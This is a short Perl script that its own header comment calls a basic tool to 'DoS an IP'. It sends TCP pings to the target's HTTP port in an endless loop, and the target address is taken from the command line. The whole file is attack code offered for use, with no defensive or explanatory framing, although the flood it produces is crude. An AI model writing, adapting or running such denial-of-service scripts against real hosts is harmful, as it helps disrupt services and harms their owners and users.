#!/usr/bin/perl
# 8-3-2020
#
# DoS an IP, very basic
# Example: ./dos.pl 127.0.0.1 0

use strict;
use warnings;
use Net::Ping;

sub ping {
	my $host = shift;
	my $p = Net::Ping->new( "tcp", 2 );
	$p->port_number( scalar( getservbyname( "http", "tcp" )));
	if ( $p->ping( $host )){
		print "$host is alive.\n" 
	} else {
		print "can't contact $host\n";
	} $p->close();
}

sub dos {
	while( 1 ){
		ping( $ARGV[ 0 ] ); # Addr to be pinged
	}
}

dos();